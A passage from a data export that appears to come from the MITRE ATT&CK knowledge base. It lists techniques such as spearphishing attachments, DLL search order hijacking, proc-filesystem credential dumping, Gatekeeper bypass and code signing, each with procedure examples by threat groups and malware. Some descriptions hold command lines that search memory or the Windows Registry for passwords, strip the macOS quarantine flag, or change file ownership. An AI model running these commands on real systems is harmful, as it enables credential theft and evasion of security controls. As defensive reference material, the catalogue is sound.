Microsoft Word and PDF attachments.', '[Patchwork] has used spearphishing with an attachment to deliver files with exploits to initial victims.', '[TA551] has sent spearphishing attachments with password protected ZIP files.', '[RTM] has used spearphishing attachments to distribute its malware.', '[APT41] sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.', '[Higaisa] has sent spearphishing emails containing malicious attachments. ', ""[Clambling] has been delivered to victim's machines through malicious e-mail attachments."", '[EnvyScout] has been distributed via spearphishing as an email attachment.', '[Squirrelwaffle] has been distributed via malicious Microsoft Office documents within spam emails.', '[Confucius] has crafted and sent victims malicious attachments to gain initial access.', '[Astaroth] has been delivered via malicious e-mail attachments.', 'During [Operation Dust Storm] the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.', '[DanBot] has been distributed within a malicious Excel attachment via spearphishing emails. ', '[WarzoneRAT] has been distributed as a malicious attachment within an email.', '[TA459] has targeted victims using spearphishing emails with malicious Microsoft Word attachments.', '[BlackTech] has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.', '[Gorgon Group] sent emails to victims with malicious Microsoft Office documents attached.', '[Leviathan] has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.', '[Mofang] delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.', '[Snip3] has been delivered to victims through malicious e-mail attachments.', '[Rifdoor] has been distributed in e-mails with malicious Excel or Word documents.', '[Valak] has been delivered via spearphishing e-mails with password protected ZIP files.', '[Naikon] has used malicious e-mail attachments to deliver malware.', '[APT12] has sent emails with malicious Microsoft Office documents and PDFs attached.', '[Bandook] is delivered via a malicious Word document inside a zip file.', '[APT19] sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.', '[ROKRAT] has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.', 'During [C0011] [Transparent Tribe] sent malicious attachments via email to student targets in India. ', 'During [Operation Spalax] the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.', '[APT30] has used spearphishing emails with malicious DOC attachments.', '[Ferocious Kitten] has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.', '[Malteiro] has sent spearphishing emails containing malicious .zip files.', '[SideCopy] has sent spearphishing emails with malicious hta file attachments.', ""During [Operation Dream Job] [Lazarus Group] sent emails with malicious attachments to gain unauthorized access to targets' computers."", '[Bisonal] has been delivered as malicious email attachments. ', '[FIN8] has distributed targeted emails containing Word documents with embedded malicious macros.', '[Nomadic Octopus] has targeted victims with spearphishing emails containing malicious attachments.', '[LazyScripter] has used spam emails weaponized with archive or document files as its initial infection vector.', '[Mustang Panda] has used spearphishing attachments to deliver initial access payloads.', '[Woody RAT] has been delivered via malicious Word documents and archive files.', '[OilRig] has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.', '[REvil] has been distributed via malicious e-mail attachments including MS Word Documents.', '[JSS Loader] has been delivered by phishing emails containing malicious Microsoft Excel attachments.', '[BADFLICK] has been distributed via spearphishing campaigns containing malicious Microsoft Word documents.', '[KONNI] has been delivered via spearphishing campaigns through a malicious Word document.', '[Transparent Tribe] has sent spearphishing e-mails with attachments to deliver malicious payloads.\t ', '[DarkGate] can be distributed through emails with malicious attachments from a spoofed email address.', '[IcedID] has been delivered via phishing e-mails with malicious attachments.', '[DarkWatchman] has been delivered via spearphishing emails that contain a malicious zip file.', '[Kimsuky] has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.', ' [Machete] has delivered spearphishing emails that contain a zipped file with malicious contents.', '[QakBot] has spread through emails with malicious attachments.', '[FIN4] has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.', '[Octopus] has been delivered via spearsphishing emails.', '[Wizard Spider] has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either [Emotet] Bokbot, [TrickBot] or [Bazar]', '[OutSteel] has been distributed as a malicious attachment within a spearphishing email.', '[Bumblebee] has gained execution through luring users into opening malicious attachments. ', '[Saint Bot] has been distributed as malicious attachments within spearphishing emails.', '[Andariel] has conducted spearphishing campaigns that included malicious Word or Excel attachments.', '[TA2541] has sent phishing emails with malicious attachments for initial access including MS Word documents.', '[ThreatNeedle] has been distributed via a malicious Word document within a spearphishing email. ', '[Tonto Team] has delivered payloads via spearphishing attachments.', '[Pony] has been delivered via spearphishing attachments.', '[Sidewinder] has sent e-mails with malicious attachments often crafted for specific targets.', '[Emotet] has been delivered by phishing emails containing attachments. ', '[TA505] has used spearphishing emails with malicious attachments to initially compromise victims.', '[FIN7] sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.', '[APT37] delivers malware using spearphishing emails with malicious HWP attachments.', '[ZxxZ] has been distributed via spearphishing emails, usually containing a malicious RTF or Excel attachment.', '[Javali] has been delivered as malicious e-mail attachments.', '[KOPILUWAK] has been delivered to victims as a malicious email attachment.', '[Silence] has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. ', '[Flagpro] has been distributed via spearphishing as an email attachment.', '[BLINDINGCAN] has been delivered by phishing emails containing malicious Microsoft Office documents.', '[IndigoZebra] sent spearphishing emails containing malicious password-protected RAR attachments.', '[APT1] has sent spearphishing emails containing malicious attachments.', '[APT38] has conducted spearphishing campaigns using malicious email attachments.', '[DarkHydrus] has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the “attachedTemplate” technique to load a template from a remote server.', '[The White Company] has sent phishing emails with malicious Microsoft Word attachments to victims.', '[NETWIRE] has been spread via e-mail campaigns utilizing malicious attachments.', '[PLATINUM] has sent spearphishing emails with attachments to victims as its primary initial access vector.', '[Rancor] has attached a malicious document to an email to gain initial access.', '[APT-C-36] has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway. ', '[APT39] leveraged spearphishing emails with malicious attachments to initially compromise victims.', '[OceanSalt] has been delivered via spearphishing emails with Microsoft Office attachments.', '[Gallmaker] sent emails with malicious Microsoft Office documents attached.', '[TrickBot] has used an email with an Excel sheet containing a malicious macro to deploy the malware', '[Frankenstein] has used spearphishing emails to send trojanized Microsoft Word documents.  ', '[Sharpshooter] has sent malicious attachments via emails to targets.', '[Dragonfly 2.0] used spearphishing with Microsoft Office attachments to target victims.', '[Magic Hound] has used personalized spearphishing attachments.', '[Turla] has used spearphishing emails to deliver [BrainTest] as a malicious attachment.']",False
T1027.008,Stripped Payloads,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.  Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript] to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.","['[macOS.OSAMiner] has used run-only Applescripts, a compiled and stripped version of [AppleScript] to remove human readable indicators to evade detection.']",False
T1559.001,Component Object Model,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by [Remote Services] such as  [Distributed Component Object Model] (DCOM).  Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic] Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job] fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.","['[POWERSTATS] can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.', '[TrickBot] used COM to setup scheduled task for persistence.', '[InvisiMole] can use the <code>ITaskService</code>, <code>ITaskDefinition</code> and <code>ITaskSettings</code> COM interfaces to schedule a task.', '[FunnyDream] can use com objects identified with `CLSID_ShellLink`(`IShellLink` and `IPersistFile`) and `WScript.Shell`(`RegWrite` method) to enable persistence mechanisms.', '[MuddyWater] has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.', ""[Ursnif] droppers have used COM objects to execute the malware's full executable payload."", '[Milan] can use a COM component to generate scheduled tasks.', '[Gamaredon Group] malware can insert malicious macros into documents using a <code>Microsoft.Office.Interop</code> object.\t', '[HermeticWizard] can execute files on remote machines using DCOM.', '[DarkTortilla] has used the `WshShortcut` COM object to create a .lnk shortcut file in the Windows startup folder.', '[Neoichor] can use the Internet Explorer (IE) COM interface to connect and receive commands from C2.', '[Bumblebee] can use a COM object to execute queries to gather system information.', '[Ramsay] can use the Windows COM API to schedule tasks and maintain persistence.', '[Gelsemium] can use the `IARPUinstallerStringLauncher` COM interface are part of its UAC bypass process.']",
T1574.001,DLL Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.  There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.   Phantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.  Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.  If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.","['[Cinnamon Tempest] has used search order hijacking to launch [Cobalt Strike] Beacons. ', '[RTM] has used search order hijacking to force TeamViewer to load a malicious DLL.', '[Tonto Team] abuses a legitimate and signed Microsoft executable to launch a malicious DLL.', '[HTTPBrowser] abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.', 'Variants of [WEBC2] achieve persistence by using DLL search order hijacking, usually by copying the DLL file to <code>%SYSTEMROOT%</code> (<code>C:\\WINDOWS\\ntshrui.dll</code>).', '[Hikit] has used [DLL Search Order Hijacking] to load <code>oci.dll</code> as a persistence mechanism.', '[Whitefly] has used search order hijacking to run the loader Vcrodat.\t', 'A [FinFisher] variant uses DLL search order hijacking.', '[Aquatic Panda] has used DLL search-order hijacking to load `exe`, `dll`, and `dat` files into memory.', '[RedLeaves] is launched through use of DLL search order hijacking to load a malicious dll.', '[PlugX] has the ability to use DLL search order hijacking for installation on targeted systems.', '[Ramsay] can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.\t', '[Evilnum] has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder. ', '[Prikormka] uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.', '[Astaroth] can launch itself via DLL Search Order Hijacking.', '[Melcoz] can use DLL hijacking to bypass security controls.', '[MirageFox] is likely loaded via DLL hijacking into a legitimate McAfee binary.', '[PowerSploit] contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.', '[FoggyWeb] loader has used DLL Search Order Hijacking to load malicious code instead of the legitimate `version.dll` during the `Microsoft.IdentityServer.ServiceHost.exe` execution process.', ' [WastedLocker] has performed DLL hijacking before execution.', '[Crutch] can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.', '[Chaes] has used search order hijacking to load a malicious DLL.', '[HUI Loader] can be deployed to targeted systems via legitimate programs that are vulnerable to DLL search order hijacking.', '[InvisiMole] can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.', '[Threat Group-3390] has performed DLL search order hijacking to execute their payload.', '[BackdoorDiplomacy] has executed DLL search order hijacking.', '[BOOSTWRITE] has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.', '[Empire] contains modules that can discover and exploit various DLL hijacking opportunities.', '[Brute Ratel C4] has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.', '[Downdelph] uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.', '[APT41] has used search order hijacking to execute malicious payloads, such as Winnti RAT.', '[menuPass] has used DLL search order hijacking.']",False
T1003.007,Proc Filesystem,"Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.  When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E ""^[0-9a-f-]* r"" /proc/""$pid""/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes. When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.  If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.","['[PACEMAKER] has the ability to extract credentials from OS memory.', ""[LaZagne] can use the `<PID>/maps` and `<PID>/mem` files to identify regex patterns to dump cleartext passwords from the browser's process memory."", '[MimiPenguin] can use the `<PID>/maps` and `<PID>/mem` file to search for regex patterns and dump the process memory.']",False
T1583.005,Botnet,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing] or Distributed Denial of Service (DDoS).",[],
T1555.005,Password Managers,"Adversaries may acquire user credentials from third-party password managers. Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.  Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory. Adversaries may extract credentials from memory via [Exploitation for Credential Access]  Adversaries may also try brute forcing via [Password Guessing] to obtain the master password of a password manager.","['During [Operation Wocao] threat actors accessed and collected credentials from password managers.', '[Threat Group-3390] obtained a KeePass database from a compromised host.', '[Fox Kitten] has used scripts to access credential information from the KeePass database.', '[MarkiRAT] can gather information from the Keepass password manager. ', '[Proton] gathers credentials in files for 1password.', '[TrickBot] can steal passwords from the KeePass open source password manager.', '[LAPSUS$] has accessed local password managers and databases to obtain further credentials from a compromised network.', '[Operation Wocao] has accessed and collected credentials from password managers.']",
T1553.001,Gatekeeper Bypass,"Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple’s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.  Based on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:  1. Checks extended attribute – Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.  2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.  3. Code Signing – Gatekeeper checks for a valid code signature from an Apple Developer ID.  4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an “unauthorized app” and the security policy will be modified.  Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion] unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.  Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise]","[""[XCSSET] has dropped a malicious applet into an app's `.../Contents/MacOS/` folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13)."", 'If running with elevated privileges, [OSX/Shlayer] has used the <code>spctl</code> command to disable Gatekeeper protection for a downloaded file. [OSX/Shlayer] can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions. [OSX/Shlayer] has been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks.', '[MacMa] has removed the `com.apple.quarantineattribute` from the dropped file, `$TMPDIR/airportpaird`.', '[OSX_OCEANLOTUS.D] uses the command <code>xattr -d com.apple.quarantine</code> to remove the quarantine file attribute used by Gatekeeper.', '[CoinTicker] downloads the EggShell mach-o binary using curl, which does not set the quarantine flag.']",False
T1608.004,Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise] In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token] Prior to [Drive-by Compromise] adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure] or previously compromised ([Compromise Infrastructure]  Adversaries may upload or inject malicious web content, such as [JavaScript] into websites. This may be done in a number of ways, including:  * Inserting malicious scripts into web pages or other user controllable web content such as forum posts * Modifying script files served to websites from publicly writeable cloud storage buckets * Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising]  In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information] to ensure it is vulnerable prior to attempting exploitation.  Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.  Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains] to help facilitate [Drive-by Compromise]","['[Transparent Tribe] has set up websites with malicious hyperlinks and iframes to infect targeted victims with [Crimson] [njRAT] and other malicious tools.', '[LuminousMoth] has redirected compromised machines to an actor-controlled webpage through HTML injection.', '[Dragonfly] has compromised websites to redirect traffic and to host exploit kits.', '[APT32] has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.', '[FIN7] has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products.', ""[Threat Group-3390] has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest."", 'For [C0010] the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.', '[Mustard Tempest] has injected malicious JavaScript into compromised websites to infect victims via drive-by download.']",False
T1553.002,Code Signing,"Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike [Invalid Code Signature] this activity will result in a valid signature.  Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform.   Code signing certificates may be used to bypass security policies that require signed code to execute on a system. ","['[Cobalt Strike] can use self signed Java applets to execute signed applet attacks.', '[BackConfig] has been signed with self signed digital certificates mimicking a legitimate software company.', '[FIN7] has signed [Carbanak] payloads with legally purchased code signing certificates. [FIN7] has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.', '[Scattered Spider] has used self-signed and stolen certificates originally issued to NVIDIA and Global Software LLC.', 'Some [Daserf] samples were signed with a stolen digital certificate.', '[Patchwork] has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.', '[HermeticWizard] has been signed by valid certificates assigned to Hermetica Digital.', '[Kimsuky] has signed files with the name EGIS CO,. Ltd..', '[Helminth] samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.', 'The [Black Basta] dropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives.', '[GALLIUM] has used stolen certificates to sign its tools including those from Whizzimo LLC.', '[APT41] leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.', 'For [C0015] the threat actors used DLL files that had invalid certificates.', '[Molerats] has used forged Microsoft code-signing certificates on malware.', '[SysUpdate] has been signed with stolen digital certificates.', 'The [HermeticWiper] executable has been signed with a legitimate certificate issued to Hermetica Digital Ltd.', '[GreyEnergy] digitally signs the malware with a code-signing certificate.', '[BLINDINGCAN] has been signed with code-signing certificates such as CodeRipper.', '[Nerex] drops a signed Microsoft DLL to disk.', '[AppleJeus] has used a valid digital signature from Sectigo to appear legitimate. ', 'During [Operation Honeybee] the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.', '[CSPY Downloader] has come signed with revoked certificates.', 'During [Operation Dream Job] [Lazarus Group] digitally signed their own malware to evade detection.', '[QakBot] can use signed loaders to evade detection. ', '[Ember Bear] has used stolen certificates from Electrum Technologies GmbH to sign payloads.', '[RTM] samples have been signed with a code-signing certificates.', '[Anchor] has been signed with valid certificates to evade detection by security tools.', '[Lazarus Group] has digitally signed malware and utilities to evade detection.', 'During the [SolarWinds Compromise] [APT29] was able to get [SUNBURST] signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.', '[Turla] has used valid digital certificates from Sysprint AG to sign its [Epic] dropper.', '[Moses Staff] has used signed drivers from an open source tool called DiskCryptor to evade detection.', '[Silence] has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).', '[SUNBURST] was digitally signed by SolarWinds from March - May 2020.', '[Wizard Spider] has used Digicert code-signing certificates for some of its malware.', '[Leviathan] has used stolen code signing certificates to sign malware.', '[FIN6] has used Comodo code-signing certificates.\t', '[Clop] can use code signing to evade detection.', '[menuPass] has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.', '[BOOSTWRITE] has been signed by a valid CA.', '[PROMETHIUM] has signed code with self-signed certificates.', '[Darkhotel] has used code-signing certificates on its malware that are either forged due to weak keys or stolen. [Darkhotel] has also stolen certificates and signed backdoors and downloaders with them.', '[Bazar] has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.', '[TA505] has signed payloads with code signing certificates from Thawte and Sectigo.', '[Metamorfo] has digitally signed executables using AVAST Software certificates. ', '[LockerGoga] has been signed with stolen certificates in order to make it look more legitimate.', '[Gazer] versions are signed with various valid certificates; one was likely faked and issued by Comodo for ""Solid Loop Ltd,"" and another was issued for ""Ultimate Computer Support Ltd.""', '[Ecipekac] has used a valid, legitimate digital signature to evade detection.', '[TrickBot] has come with a signed downloader component.', '[More_eggs] has used a signed binary shellcode loader and a signed Dynamic Link Library (DLL) to create a reverse shell.', '[Suckfly] has used stolen certificates to sign its malware.', 'A [QuasarRAT] .dll file is digitally signed by a certificate from AirVPN.', '[Stuxnet] used a digitally signed driver with a compromised Realtek certificate.', '[Ebury] has installed a self-signed RPM package mimicking the original system package on RPM based systems.', '[SpicyOmelette] has been signed with valid digital certificates.', '[StrongPity] has been signed with self-signed certificates.', '[LuminousMoth] has signed their malware with a valid digital signature.', '[PipeMon] its installer, and tools are signed with stolen code-signing certificates.', '[Winnti Group] used stolen certificates to sign its malware.', '[CopyKittens] digitally signed an executable with a stolen certificate from legitimate company AI Squared.', '[Janicab] used a valid AppleDeveloperID to sign the code to get past security restrictions.', '[ChChes] samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.', '[Bandook] was signed with valid Certum certificates. ', '[UNC2452] was able to get [SUNBURST] signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.', '[APT29] was able to get [SUNBURST] signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.', '[Honeybee] uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.', '[SDelete] is digitally signed by Microsoft.']",False
T1565.003,Runtime Data Manipulation,"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.  Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association] and [Masquerading] to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",['[APT38] has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.'],
T1552.002,Credentials in Registry,Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.  Example commands to find Registry keys related to password information:   * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code> * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>,"['[Reg] may be used to find credentials in the Windows Registry.', '[PowerSploit] has several modules that search the Windows Registry for stored credentials: <code>Get-UnattendedInstallFile</code>, <code>Get-Webconfig</code>, <code>Get-ApplicationHost</code>, <code>Get-SiteListPassword</code>, <code>Get-CachedGPPPassword</code>, and <code>Get-RegistryAutoLogon</code>.', '[APT32] used Outlook Credential Dumper to harvest credentials stored in Windows registry.', '[IceApple] can harvest credentials from local and remote host registries.', '[TrickBot] has retrieved PuTTY credentials by querying the <code>Software\\SimonTatham\\Putty\\Sessions</code> registry key ', '[Valak] can use the clientgrabber module to steal e-mail credentials from the Registry.', '[Agent Tesla] has the ability to extract credentials from the Registry. ']",False
T1036.009,Break Process Trees,"An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child"" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.   On Linux systems, adversaries may execute a series of [Native API] calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.  Another example is using the “daemon” syscall to detach from the current parent process and run in the background. ",[],False
T1590.004,Network Topology,"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.  Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning] or [Phishing for Information] Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [External Remote Services]",['[FIN13] has searched for infrastructure that can provide remote access to an environment for targeting efforts.'],
T1587.002,Code Signing Certificates,Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.  Prior to [Code Signing] adversaries may develop self-signed code signing certificates for use in operations.,"['[PROMETHIUM] has created self-signed certificates to sign malicious installers.', '[Patchwork] has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.', 'During [Operation Dream Job] [Lazarus Group] digitally signed their malware and the dbxcli utility.']",
T1222.001,Windows File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).  Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.  Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell] provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features] [Boot or Logon Initialization Scripts] or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow]","['[JPIN] can use the command-line utility cacls.exe to change file permissions.', ""[BitPaymer] can use <code>icacls /reset</code> and <code>takeown /F</code> 